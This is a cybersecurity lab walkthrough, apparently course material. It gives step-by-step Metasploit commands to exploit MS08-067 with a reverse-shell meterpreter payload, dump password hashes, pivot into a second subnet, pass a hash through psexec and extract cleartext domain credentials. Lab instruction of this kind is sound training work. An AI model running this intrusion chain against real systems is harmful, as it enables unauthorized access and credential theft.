## Warm Up and Setup for Next Activity

This activity will be a review of the topics and techniques that we learned in the last class such as scanning and exploiting vulnerabilities, maintaining access, and using pivot points to attack other machines on the network.  If you need additional help feel free to use the CybrScore hints, but ideally you should use your notes and reach out to your neighbor. Good luck! 

---

In the next steps, you will use Metasploit CLI and its counterpart, Meterpreter, to exploit the vulnerabilities you identified earlier in the lab. You will exploit each host in the initial subnet following a defined set of steps and use the information obtained from each exploit attempt to help pivot into a new subnet and exploit other hosts.

- Open a terminal prompt by clicking the Terminal icon in the side bar.

- Starts the built-in postgresql server, if it's not already running. If you get an error with this command, ignore it an run the next command.
  - `service postgresql start`

- Initializes the Metasploit database
  - `msfdb init`

- Type `msfconsole` and press ENTER.
  - Once Metasploit has succesfully loaded, you will be presented with the msf prompt: `msf >`

- At the metasploit prompt, type `db_nmap -sV -F -O 10.10.10.0/24` and press ENTER. 
  - The scan should finish relatively quickly, and the raw results of the scan should be returned.

- At the metasploit prompt, type `use exploit/windows/smb/ms08_067_netapi` and press ENTER.

- Type `set payload windows/meterpreter/reverse_tcp` and press ENTER.

- Type `set RHOST 10.10.10.20` and press ENTER to change the remote host option to the victim's IP address.

- Type `set LHOST 10.10.10.10` and press ENTER to change the local host option for the meterpreter payload to your Kali VM's IP address.

- Type `set LPORT 4444` and press ENTER to change the listening port for the meterpreter payload to port 4444.

- Type `run -j` and press ENTER to run the exploit
  - Once the exploit has finished running, you should see a message that says "Meterpreter session 1 opened". At the prompt, type sessions and press ENTER to see your currently active command/meterpreter shell sessions, and you should see a meterpreter session, running as the SYSTEM user, on 10.10.10.20.
  
- Type `background` to background the session. 

- Type `use post/windows/gather/hashdump` and press ENTER

- Type `set SESSION 1` and press ENTER

- Type `run -j` and press ENTER to run the module. The module till run, and dump the password hashes that it finds.

- At the msf prompt, type `creds` and press ENTER to see your recently dumped password hashes now stored in the Metasploit database, which we will use later in this lab.

- At the msf prompt, type `use post/multi/manage/autoroute` and press ENTER

- Type `set CMD add` and press ENTER to change the command to add only the routes you specify.

- Type `set SUBNET 172.16.0.0` and press ENTER.

- Type `set SESSION 1` and press ENTER.
  - Ensure that the NETMASK variable is set to 255.255.255.0

- Type `run` and press ENTER. You will receive output about the successful route being added. You can confirm that the route has been added, or view existing routes, by typing `route` and pressing ENTER at the msf prompt at any time.

- At the msf prompt, use the `auxiliary/scanner/portscan/tcp`. 
  - Type `use auxiliary/scanner/portscan/tcp`
  
- Use show options to view the options available to you in this module.

- Set the ports `139`,`445`, and `3389`. 
  - Type `set PORTS 139,445,3389`. 

- Set the rhosts to `172.16.0.0/24` 
  - Type `set RHOSTS 172.16.0.0/24`

- Set the threads to 50 and run it. The scan could take up to 10 minutes to complete. 
  - Type `set THREADS 50` then `run`. 

---

Now that you have identified the live hosts, we can use another Metasploit module to scan for SMB version to identify the exact version of Windows that each host is running.

- Use the `auxiliary/scanner/smb/smb_version` module and set the following:

- Using the hosts that you found in step 30, set the remote host targets with the RHOSTS parameter. Specify as many hosts as were found during step 30, then run the module.

- **Hint:** We have used the set RHOSTS 172.16.0.XXX,YYY notation, where XXX and YYY are the last octet of the hosts that you find, up to the total number of hosts found. You can also separate your RHOSTS parameter by specifying each host's full IP address, with each host separated with a space, rather than a comma: set RHOSTS 172.16.0.XXX 172.16.0.YYY and so on.
At the msf prompt, type hosts and services to confirm that the results of your new scan have populated the database for easy reference later.

  - Type: `set RHOSTS 172.16.0.150,175,200,250` 

- At the msf prompt, type `use exploit/windows/smb/psexec`

- Type `set RHOST 172.16.0.150` and press ENTER.

- Type `creds` and copy the administrator password. 

- Type `set SMBPass aad3b435b51404eeaad3b435b51404ee:4d0e3ba8f118cc5143d62505e9d51a6c` and paste the hash that you copied in the last step. 

- Type `set SMBUser administrator`

- Type `set payload windows/x64/meterpreter/bind_tcp` and press ENTER

- Type `set LPORT 4444` and press ENTER

- Type `run` within a few seconds, you should get a message with "Meterpreter session 2 opened".
  - If you do not, **try running the exploit again**.

- With a SYSTEM meterpreter shell on the new machine in the network, you can now attempt to dump hashes and hopefully any domain credentials in memory. 

- Type `background`

- Type `use post/windows/gather/hashdump` and press ENTER

- Type `set SESSION 2` and press ENTER.

- Type `run -j` and press ENTER to dump the local hashes found.

- Next, type `use post/windows/gather/credentials/sso` and press ENTER.

- Type `set SESSION 2` and press ENTER.

- Type `run` and press ENTER to run the module, and dump the credentials, in plaintext for any domain users that have logged in.

- Run `creds` at the msf prompt once more to see your newly acquired cleartext domain credentials.
